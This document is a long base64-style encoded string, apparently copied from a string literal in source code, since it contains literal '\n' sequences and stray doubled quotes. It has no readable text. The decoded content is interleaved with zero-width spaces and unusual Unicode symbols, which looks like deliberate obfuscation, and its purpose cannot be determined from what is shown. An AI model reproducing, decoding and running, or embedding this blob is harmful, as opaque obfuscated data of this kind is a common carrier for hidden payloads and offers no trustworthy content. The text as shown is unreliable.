vigKTigIvigbzigIvigbzigIvigbzigIvigKXigIvigaLigIvigaXigIvigbjigIvigb/igIvigari\ngIvigazigIvigbnigIvigarigIvigabigIvigKXigIvigajigIvigaTigIvigabigIvigKTigIvigbDi\ngIvigb7igIvigbjigIviga7igIvigbnigIvigaXigIvigarigIvigabigIviga7igIvigbbigIvigKvi\ngIvigKvigIvigIHigIvcreKAi+KAq+KAi/CdkaPigIsG4oCL8J2SsOKAi+KAq+KAi+KBieKAi+KBkuKA\ni+KAq+KAi+KAseKAi+KAq+KAi+KBi+KAi+KBpuKAi+KBpuKAi+KBo+KAi+KBo+KAi+KBpeKAi+KAq+KA\ni9yt4oCL4oCr4oCL4oGL4oCL4oGm4oCL4oGm4oCL4oGm4oCL4oGj4oCL4oGl4oCL4oCs4oCL4oCs4oCL\n4oCs4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCB4oCL4oCr4oCL4oCr4oCL\n4oCr4oCL4oCr4oCL4oG44oCL4oG44oCL4oCr4oCL4oC24oCL4oCr4oCL4oGt4oCL4oCs4oCL4oCs4oCL\n4oCs4oCL3rbigIvUi+KAi9SL4oCL1IvigIvwn5mK4oCL8J+ZiOKAi/CfmLXigIvwn5mN4oCL4oCr4oCL\n8J+YtOKAi/CfmY/igIvwn5i04oCL4oCr4oCL8J+Zj+KAi/CfmYTigIvUi+KAi9SL4oCL1IvigIvUi+KA\ni92u4oCL4oCB4oCL8J2TkOKAi+KAq+KAi+KBheKAi+KBquKAi+KBpuKAi+KBruKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAseKAi+KAq+KAi+20teKAi+KAq+KA\ni+KBsOKAi+KBreKAi+KBvuKAi+KBp+KAi+KBp+KAi+KBlOKAi+KBpeKAi+KBquKAi+KBpuKAi+KBruKA\ni+KBtuKAi+KAq+KAi+20tOKAi+KAq+KAi+KAq+KAi+KAgeKAi/Cdka/igIvigKvigIvigZ7igIvigbji\ngIviga7igIvigbnigIvigaXigIvigarigIvigabi""gIviga7igIvigKvigIvigKvigIvigKvigIvigKvi\ngIvigLHigIvigKvigIvttLXigIvigKvigIvigYvigIvigbDigIvigb7igIvigbjigIviga7igIvigbni\ngIvigaXigIvigarigIvigabigIviga7igIvigbbigIvigKvigIvttLTigIvigKvigIvigKvigIvigIHi\ngIvwnZOs4oCL4oCr4oCL4oGO4oCL4oGm4oCL4oGq4oCL4oGi4oCL4oGn4oCL4oCr4oCL4oCr4oCL4oCr\n4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCx4oCL4oCr4oCL7bS14oCL4oCr4oCL4oGw4oCL4oG+\n4oCL4oG44oCL4oGu4oCL4oG54oCL4oGl4oCL4oGq4oCL4oGm4oCL4oGu4oCL4oG24oCL4oGL4oCL4oGs\n4oCL4oGm4oCL4oGq4oCL4oGi4oCL4oGn4oCL4oCl4oCL4oGo4oCL4oGk4oCL4oGm4oCL4oCr4oCL7bS0\n4oCL4oCr4oCL4oCr4oCL4oCB4oCL2bDigIvtuITigIvigKvigIvigZnigIviga7igIvigbjigIviga7i\ngIvigb/igIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigLHigIvigKvi\ngIvttLXigIvigKvigIvigbDigIvigbnigIviga7igIvigbjigIvigb/igIvigKPigIvigb7igIvigbji\ngIviga7igIvigbnigIvigaXigIvigarigIvigabigIviga7igIvigKLigIvigbbigIvigKvigIvttLTi\ngIvigKvigIvigKvigIvigIHigIvwnZGu4oCL4oCr4oCL4oGN4oCL4oGk4oCL4oGn4oCL4oGn4oCL4oGk\n4oCL4oG84oCL4oGu4oCL4oG54oCL4oG44oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCx4oCL4oCr4oCL7bS1\n4oCL4oCr4oCL4oGw4oCL4oGt4oCL4oGk4oCL4oG84oCL4oG44oCL4oG24oCL4oCr4oCL7bS04oCL4oCr\n4oCL4oCr4oCL4oCB4oCL3qrigIvtuITigIvigKvigIvigY3igIvigaTigIvigafigIvigafigIvigaTi\ngIvigbzigIvigaLigIvigaXigIvigazigIvigKvigIvigKvigIvigKvigIvigLHigIvigKvigIvttLXi\ngIvigKvigIvigbDigIviga3igIvigaTigIvigbzigIvigazigIvigbbigIvigKvigIvttLTigIvigKvi\ngIvigKvigIvigIHigIvwnZOW4oCL4oCr4oCL4oGb4oCL4oGk4oCL4oG44oCL4oG/4oCL4oG44oCL4oCr\n4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCx4oCL4oCr4oCL7bS14oCL4oCr\n4oCL4oGw4oCL4oG74oCL4oG74oCL4oG24oCL4oCr4oCL7bS04oCL4oCr4oCL4oCr4oCL4oCB4oCL8J2n\nteKAi+KAq+KAi+KBieKAi+KBouKAi+KBpOKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KA\nq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAseKAi+KAq+KAi+20teKAi+KAq+KAi+KBsOKAi+KBqeKAi+KB\nouKAi+KBpOKAi+KBtuKAi+KAq+KAi+20tOKAi+KAq+KAi+KAq+KAi+KAgeKAi/Cdhp/igIvigKvigIvi\ngZ7igIvigbjigIviga7igIvigbnigIvigKvigIvigYLigIvigY/igIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigLHigIvigKvigIvttLXigIvigKvigIvigbDigIvigYLigIviga/igIvi""gbbigIvi\ngKvigIvttLTigIvigKvigIvigKvigIvigIHigIvwnZOO4oCL4oCr4oCL4oGS4oCL4oGu4oCL4oGq4oCL\n4oG54oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCr4oCL4oCx4oCL\n4oCr4oCL7bS14oCL4oCr4oCL4oGw4oCL4oGv4oCL4oGq4oCL4oG/4oCL4oGu4oCL4oCj4oCL4oGC4oCL\n4oGv4oCL4oCi4oCL4oG24oCL4oCr4oCL7bS04oCL4oCr4oCL4oCr4oCL4oCB4oCLxLLigIvtuITigIvi\ngKvigIvigYbigIviga7igIvigb/igIvigarigIvigKvigIvigYLigIvigaXigIviga3igIvigaTigIvi\ngKvigIvigKvigIvigKvigIvigLHigIvigKvigIvttLXigIvigKvigIvigbDigIvigabigIviga7igIvi\ngb/igIvigarigIvigbbigIvigKvigIvttLTigIvigKvigIvigKvigIvigIHigIvwnY+p4oCL4oCr4oCL\n4oGJ4oCL4oG+4oCL4oG44oCL4oGi4oCL4oGl4oCL4oGu4oCL4oG44oCL4oG44oCL4oCr4oCL4oCr4oCL\n4oCr4oCL4oCr4oCL4oCx4oCL4oCr4oCL7bS14oCL4oCr4oCL4oGw4oCL4oGp4oCL4oGi4oCL4oGx4oCL\n4oGx4oCL4oG24oCL4oCr4oCL7bS04oCL4oCr4oCL4oCr4oCL4oCB4oCL8J2UnOKAi+KAq+KAi+KBguKA\ni+KBpeKAi+KBuOKAi+KBv+KAi+KBquKAi+KBrOKAi+KBueKAi+KBquKAi+KBpuKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAseKAi+KAq+KAi+KBo+KAi+KBv+KAi+KBv+KAi+KBu+KAi+KBuOKAi+KAseKAi+KApOKA\ni+KApOKAi+KBvOKAi+KBvOKAi+KBvOKAi+KApeKAi+KBouKAi+KBpeKAi+KBuOKAi+KBv+KAi+KBquKA\ni+KBrOKAi+KBueKAi+KBquKAi+KBpuKAi+KApeKAi+KBqOKAi+KBpOKAi+KBpuKAi+KApOKAi+KBsOKA\ni+KBvuKAi+KBuOKAi+KBruKAi+KBueKAi+KBpeKAi+KBquKAi+KBpuKAi+KBruKAi+KBtuKAi+KAq+KA\ni+KAq+KAi+KAgeKAi9yt4oCL4oCr4oCL8J2Ro+KAiwbigIvwnZKw4oCL4oCr4oCL4oGJ4oCL4oGS4oCL\n4oCr4oCL4oCx4oCL4oCr4oCL4oCr4oCL4oGL4oCL4oGm4oCL4oGm4oCL4oGj4oCL4oGj4oCL4oGl4oCL\n4oCr4oCL3K3igIvigKvigIvigYvigIvigabigIvigabigIvigabigIvigaPigIvigaXigIvigKzigIvi\ngKzigIvigKzigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigb/igIvigbnigIvigbLigIvigLHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigb/igIvigbnigIvigbLigIvigLHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigI""vigKvigIvigKvigIvigKvigIvigbnigIviga7igIvigbrigIvigb7igIvi\nga7igIvigbjigIvigb/igIvigbjigIvigKXigIvigazigIviga7igIvigb/igIvigKPigIviga3igIvi\ngKnigIvigaPigIvigb/igIvigb/igIvigbvigIvigbjigIvigLHigIvigKTigIvigKTigIvigarigIvi\ngbvigIvigaLigIvigKXigIvigb/igIviga7igIvigafigIviga7igIvigazigIvigbnigIvigarigIvi\ngabigIvigKXigIvigaTigIvigbnigIvigazigIvigKTigIviganigIvigaTigIvigb/igIvigLzigIvi\ngL/igIvigLPigIvigLPigIvigLLigIvigL3igIvigLvigIvigLLigIvigLvigIvigL7igIvigLHigIvi\ngYrigIvigYrigIvigY3igIvigZzigIvigaLigIvigZPigIvigaLigIvigaLigIvigYTigIvigZHigIvi\ngYXigIvigbHigIvigYfigIvigZ3igIvigYLigIvigajigIvigLrigIvigabigIvigazigIvigLrigIvi\ngZTigIvigLvigIvigZTigIvigbLigIvigbHigIvigaDigIvigZ/igIvigLrigIvigY/igIvigYXigIvi\ngYbigIvigL7igIviga/igIvigaDigIvigL/igIvigKTigIvigbjigIviga7igIvigaXigIviga/igIvi\ngYbigIviga7igIvigbjigIvigbjigIvigarigIvigazigIviga7igIvigLTigIvigajigIvigaPigIvi\ngarigIvigb/igIvigZTigIvigaLigIviga/igIvigLbigIvigLPigIvigLvigIvigLjigIvigLrigIvi\ngLPigIvigLrigIvigLLigIvigL/igIvigL7igIvigK3igIvigb/igIviga7igIvigbPigIvigb/igIvi\ngLbigIvigbDigIvigYLigIvigY/igIvigbbigIvigZfigIvigaXigIvigbDigIvigbjigIvigbjigIvi\ngbbigIvigKnigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIviga7igIvigbPigIvi\ngajigIviga7igIvigbvigIvigb/igIvigKvigIvigY7igIvigbPigIvigajigIviga7igIvigbvigIvi\ngb/igIvigaLigIvigaTigIvigaXigIvigKvigIvigarigIvigbjigIvigKvigIviga7igIvigLHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigbvigIvi\ngbnigIvigaLigIvigaXigIvigb/igIvigKPigIviga3igIvigKnigIvigKvigIvigKvigIvigaPigIvi\ngKvigIvigKnigIvigKLigIvigKvigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigb/igIvi\ngbnigIvigbLigIvigLHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigI""vigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigbnigIviga7igIvigbrigIvigb7igIviga7igIvigbjigIvigb/igIvigbjigIvi\ngKXigIvigazigIviga7igIvigb/igIvigKPigIviga3igIvigKnigIvigaPigIvigb/igIvigb/igIvi\ngbvigIvigbjigIvigLHigIvigKTigIvigKTigIvigarigIvigbvigIvigaLigIvigKXigIvigb/igIvi\nga7igIvigafigIviga7igIvigazigIvigbnigIvigarigIvigabigIvigKXigIvigaTigIvigbnigIvi\ngazigIvigKTigIviganigIvigaTigIvigb/igIvigLzigIvigLLigIvigL3igIvigLvigIvigLzigIvi\ngL3igIvigLvigIvigLnigIvigL7igIvigLnigIvigLHigIvigYrigIvigYrigIvigY3igIvigY7igIvi\ngZnigIvigarigIvigL7igIvigLjigIvigZPigIvigbPigIvigYzigIvigY7igIvigYTigIvigYzigIvi\ngbLigIvigazigIvigZTigIvigLLigIvigL/igIvigY/igIvigazigIvigZrigIvigb3igIvigajigIvi\ngZTigIvigLPigIvigZ/igIvigYfigIvigb/igIvigaXigIvigZvigIvigLvigIvigaPigIvigYDigIvi\ngbzigIvigKTigIvigbjigIviga7igIvigaXigIviga/igIvigYbigIviga7igIvigbjigIvigbjigIvi\ngarigIvigazigIviga7igIvigLTigIvigajigIvigaPigIvigarigIvigb/igIvigZTigIvigaLigIvi\nga/igIvigLbigIvigLzigIvigL/igIvigL7igIvigL/igIvigLPigIvigLzigIvigLLigIvigLrigIvi\ngLrigIvigLPigIvigK3igIvigb/igIviga7igIvigbPigIvigb/igIvigLbigIvigbDigIvigbjigIvi\ngb/igIviga7igIvigaLigIvigaXigIvigbbigIvigKnigIvigKLigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIviga7igIvigbPigIvigajigIviga7igIvigbvigIvigb/igIvigKvigIvigY7igIvi\ngbPigIvigajigIviga7igIvigbvigIvigb/igIvigaLigIvigaTigIvigaXigIvigKvigIvigarigIvi\ngbjigIvigKvigIviga7igIvigLHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigbvigIvigbnigIvigaLigIvigaXigIvigb/igIvigKPigIviga3igIvi\ngKnigIvigKvigIvigKvigIvigaPigIvigKvigIvigKnigIvigKLigIvigKvigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigb/igIvigbnigIvigbLigIvigLHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvi""gIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigbnigIviga7igIvigbrigIvigb7igIvi\nga7igIvigbjigIvigb/igIvigbjigIvigKXigIvigazigIviga7igIvigb/igIvigKPigIviga3igIvi\ngKnigIvigaPigIvigb/igIvigb/igIvigbvigIvigbjigIvigLHigIvigKTigIvigKTigIvigarigIvi\ngbvigIvigaLigIvigKXigIvigb/igIviga7igIvigafigIviga7igIvigazigIvigbnigIvigarigIvi\ngabigIvigKXigIvigaTigIvigbnigIvigazigIvigKTigIviganigIvigaTigIvigb/igIvigbDigIvi\ngZ/igIvigaTigIvigaDigIviga7igIvigaXigIvigbbigIvigKTigIvigbjigIviga7igIvigaXigIvi\nga/igIvigYbigIviga7igIvigbjigIvigbjigIvigarigIvigazigIviga7igIvigLTigIvigajigIvi\ngaPigIvigarigIvigb/igIvigZTigIvigaLigIviga/igIvigLbigIvigbDigIvigYLigIvigY/igIvi\ngbbigIvigK3igIvigb/igIviga7igIvigbPigIvigb/igIvigLbigIvigbDigIvigbjigIvigbjigIvi\ngbbigIvigKnigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIviga7igIvigbPigIvi\ngajigIviga7igIvigbvigIvigb/igIvigKvigIvigY7igIvigbPigIvigajigIviga7igIvigbvigIvi\ngb/igIvigaLigIvigaTigIvigaXigIvigKvigIvigarigIvigbjigIvigKvigIviga7igIvigLHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigbvigIvi\ngbnigIvigaLigIvigaXigIvigb/igIvigKPigIviga3igIvigKnigIvigKvigIvigKvigIvigaPigIvi\ngKvigIvigKnigIvigKLigIvigKvigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIviga7igIvigbPigIvigajigIviga7igIvigbvigIvi\ngb/igIvigLHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigbvigIvigbnigIvigaLigIvi\ngaXigIvigb/igIvigKPigIviga3igIvigKnigIvigKvigIvigKvigIvigaPigIvigKvigIvigKnigIvi\ngKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIviga/igIviga7igIviga3igIvigKvigIvigYzigIvi\ngabigIvigarigIvigaLigIvigafigIvigKPigIviga7igIvigabigIvigarigIvigaLigIvigafigIvi\ngKLigIvigLHigIvigIHigIvigIHigIvigIHi""gIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigazigIvigafigIvigaTigIviganigIvigarigIvigafigIvigKvigIvi\nganigIvigarigIviga/igIviga7igIvigabigIvigarigIvigaLigIvigafigIvigKfigIvigKvigIvi\ngaPigIvigaLigIvigb/igIvigbjigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigb/igIvigbnigIvigbLigIvigLHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigaLigIviga3igIvigKvigIvigKzigIvigYvigIvigKzigIvi\ngKvigIvigaLigIvigaXigIvigKvigIviga7igIvigabigIvigarigIvigaLigIvigafigIvigLHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIviga7igIvi\ngabigIvigarigIvigaLigIvigafigIvigKvigIvigLbigIvigKvigIvigbjigIvigb/igIvigbnigIvi\ngKPigIviga7igIvigabigIvigarigIvigaLigIvigafigIvigKLigIvigKXigIvigbjigIvigbvigIvi\ngafigIvigaLigIvigb/igIvigKPigIvigKzigIvigYvigIvigKzigIvigKLigIvigZDigIvigLvigIvi\ngZbigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigb/igIvigbnigIvigbLigIvigLHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigaTigIvigKvigIvigLbigIvigKvigIvi\ngaTigIvigbvigIviga7igIvigaXigIvigKPigIvigKzigIvigb/igIvigafigIvigKXigIvigb/igIvi\ngbPigIvigb/igIvigKzigIvigKfigIvigKvigIvigKzigIvigbnigIvigKzigIvigKLigIvigKXigIvi\ngbnigIviga7igIvigarigIviga/igIvigKPigIvigKLigIvigKXigIvigbjigIvigbvigIvigafigIvi\ngaLigIvigb/igIvigafigIvigaLigIvigaXigIviga7igIvigbjigIvigKPigIvigKLigIvigZDigIvi\ngLvigIvigZbigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIviga7igIvigbPigIvigajigIvi\nga7igIvigbvigIvigb/igIvigLHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHi""gIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigaTigIvigKvigIvigLbigIvigKvigIvigaTigIvigbvigIviga7igIvi\ngaXigIvigKPigIvigKzigIvigb/igIvigafigIvigKXigIvigb/igIvigbPigIvigb/igIvigKzigIvi\ngKfigIvigKvigIvigKzigIvigbnigIvigKzigIvigKLigIvigKXigIvigbnigIviga7igIvigarigIvi\nga/igIvigKPigIvigKLigIvigKXigIvigbjigIvigbvigIvigafigIvigaLigIvigb/igIvigafigIvi\ngaLigIvigaXigIviga7igIvigbjigIvigKPigIvigKLigIvigZDigIvigLvigIvigZbigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigb/igIvigafigIvigKfigIvigKvigIvigaPigIvigaTigIvigbjigIvigb/igIvigKvigIvi\ngLbigIvigKvigIvigaTigIvigKXigIvigbjigIvigbvigIvigafigIvigaLigIvigb/igIvigKPigIvi\ngKzigIvigKTigIvigKTigIvigKzigIvigKLigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigajigIvigaTigIvigaTigIvi\ngaDigIvigaLigIviga7igIvigbjigIvigKvigIvigLbigIvigKvigIvigbDigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKzigIvigZTigIvigZTigIvigYPigIvigaTigIvigbjigIvigb/igIvi\ngKbigIvigYzigIvigYrigIvigZvigIvigZjigIvigKzigIvigLHigIvigKvigIvigaPigIvigaTigIvi\ngbjigIvigb/igIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigbbigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigaPigIvi\nga7igIvigarigIviga/igIviga7igIvigbnigIvigbjigIvigKvigIvigLbigIvigKvigIvigbDigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigarigIvigb7igIvigb/igIvigaPigIvi\ngaTigIvigbnigIvigaLigIvigb/igIvigbLigIvigKzigIvigLHigIvigKvigIvigKzigIvigarigIvi\ngajigIvigajigIviga""TigIvigb7igIvigaXigIvigb/igIvigbjigIvigKXigIvigazigIvigaTigIvi\ngaTigIvigazigIvigafigIviga7igIvigKXigIvigajigIvigaTigIvigabigIvigKzigIvigKfigIvi\ngIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigarigIvigajigIvigajigIviga7igIvi\ngbvigIvigb/igIvigKzigIvigLHigIvigKvigIvigKzigIvigKHigIvigKTigIvigKHigIvigKzigIvi\ngKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigarigIvigajigIvigajigIvi\nga7igIvigbvigIvigb/igIvigKbigIvigafigIvigarigIvigaXigIvigazigIvigb7igIvigarigIvi\ngazigIviga7igIvigKzigIvigLHigIvigKvigIvigKzigIviga7igIvigaXigIvigKbigIvigZ7igIvi\ngZjigIvigKfigIviga7igIvigaXigIvigLDigIvigbrigIvigLbigIvigLvigIvigKXigIvigLLigIvi\ngKzigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigajigIvigaTigIvi\ngaXigIvigb/igIviga7igIvigaXigIvigb/igIvigKbigIvigb/igIvigbLigIvigbvigIviga7igIvi\ngKzigIvigLHigIvigKvigIvigKzigIvigarigIvigbvigIvigbvigIvigafigIvigaLigIvigajigIvi\ngarigIvigb/igIvigaLigIvigaTigIvigaXigIvigKTigIvigbPigIvigKbigIvigbzigIvigbzigIvi\ngbzigIvigKbigIviga3igIvigaTigIvigbnigIvigabigIvigKbigIvigb7igIvigbnigIvigafigIvi\nga7igIvigaXigIvigajigIvigaTigIviga/igIviga7igIviga/igIvigLDigIvigajigIvigaPigIvi\ngarigIvigbnigIvigbjigIviga7igIvigb/igIvigLbigIvigZ7igIvigZ/igIvigY3igIvigKbigIvi\ngLPigIvigKzigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigazigIvi\ngaTigIvigaTigIvigazigIvigafigIviga7igIvigKbigIvigarigIvigajigIvigajigIvigaTigIvi\ngb7igIvigaXigIvigb/igIvigbjigIvigKbigIvigbPigIvigbjigIvigbnigIviga3igIvigKzigIvi\ngLHigIvigKvigIvigKzigIvigLrigIvigKzigIvigKfigIvigIHigIvigIHigIvigIHigIvigIHigIvi\ngIHigIvigIHigIvigIHigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvi\ngKvigIvigKzigIvigaTigIvigbnigIvigaLigIvigazigIviga""LigIvigaXigIvigKzigIvigLHigIvi\ngKvigIvigKzigIvigaPigIvigb/igIvigb/igIvigbvigIvigbjigIvigLHigIvigKTigIvigKTigIvi\ngarigIvigajigIvigajigIvigaTigIvigb7igIvigaXigIvigb/igIvigbjigIvigKXigIvigazigIvi\ngaTigIvigaTigIvigazigIvigafigIviga7igIvigKXigIvigajigIvigaTigIvigabigIvigKzigIvi\ngKfigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigIHigIvigKvigIvigKvigIvi\ngKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKvigIvigKzigIvigbnigIviga7igIviga3igIvi\nga7igIvigbnigIviga7igIvigbnigIvigKzigIvigLHigIvigKvigIvigKzigIvigaPigIvigb/igIvi\ngb/igIvigbvigIvigbjigIvigLHigIvigKTigIvigKTigIvigarigIvigajigIvigajigIvigaTigIvi\ngb7igIvigaXigIvigb/igIvigbjigIvigKXigIvigazigIvigaTigIvigaTigIvigazigIvigafigIvi\nga7igIvigKXigIvigajigIvigaTigIvigabigIvigKTigIvigbjigIvigaLigIvigazigIvigaXigIvi\ngb7igIvigbvigIvigKTigIvigb3igIvigLnigIvigKTigIvigajigIvigbnigIviga7igIvigarigIvi\ngb/igIviga7igIvigb7igIvigbjigIviga7igIvigbnigIvigaXigIvigarigIvigabigIviga7igIvi\ngLTigIvigbjigIviga7igIvigbnigIvigb3igIvigaLigIvigajigIviga7igIvigLbigIvigabigIvi\ngarigIvigaLigIvigafigIvigK3igIvigajigIvigaTigIvigaXigIvigb/igIvigaLigIvigaXigIvi\ngb7igIviga7igIvigLbigIvigaPigIvigb/igIvigb/igIvigbvigIvigbjigIvigK7igIvigLjigIvi\ngYrigIvigK7igIvigLnigIvigY3igIvigK7igIvigLnigIvigY3igIvigabigIvigarigIvigaLigIvi\ngafigIvigKXigIvigazigIvigaTigIvigaTigIvigazigIvigafigIviga7igIvigKXigIvigajigIvi\ngaTigIvigabigIvigK7igIvigLnigIvigY3igIvigabigIvigarigIvigaLigIvigafigIvigK7igIvi\ngLnigIvigY3igIvigb7igIvigK7igIvigLnigIvigY3igIvigLvigIvigK7igIvigLnigIvigY3igIvi\ngK3igIvigbvigIvigarigIvigbnigIviga7igIvigaXigIvigb/igIvigZTigIviga/igIvigaLigIvi\ngbnigIviga7igIvigajigIvigb/igIviga7igIviga/igIvigLbigIvigb/igIvigbnigIvigb7igIvi\nga7igIvigK3igIvigb/igIvigaPigIviga7igIvigabigIviga7igIvigLbigIvigabigIvigaXigIvi\ngK3igIviga/igIviga/igIvigabigIvigLbigIvigLvigIvigK3igIviga3igIvigafigIvigaTigIvi\ngbzigIvigYXigIvigarigIvigabigIviga7igIvigLbigIvigYzigIvigafigIvigaLigIviga3igIvi\ngZzigIviga7igIviganigIvigZjigIv